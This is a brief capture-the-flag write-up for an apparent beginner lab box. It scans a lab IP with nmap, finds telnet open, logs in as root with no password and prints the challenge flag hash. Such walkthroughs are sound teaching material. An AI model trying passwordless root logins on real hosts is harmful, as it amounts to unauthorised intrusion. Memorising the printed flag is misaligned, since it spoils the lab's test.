# telnet (linux)

## Scan

```bash
nmap -sV 10.129.45.137

# PORT   STATE SERVICE VERSION
# 23/tcp open  telnet  Linux telnetd
```

port 23 (telnet) is open, we can connect to the machine using telnet.

## Exploit

```bash
telent 10.129.45.137

# Trying 10.129.45.137...
# Connected to 10.129.45.137.
# Escape character is '^]'.

# Meow login: 
```

We try root first.

```bash
# Meow login: root
# Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-77-generic x86_64)
```

Success (no password required?).

```bash
$ ls
# flag.txt  snap
$ cat flag.txt
# b40abdfe23665f766f9c61ecba8a4c19
```
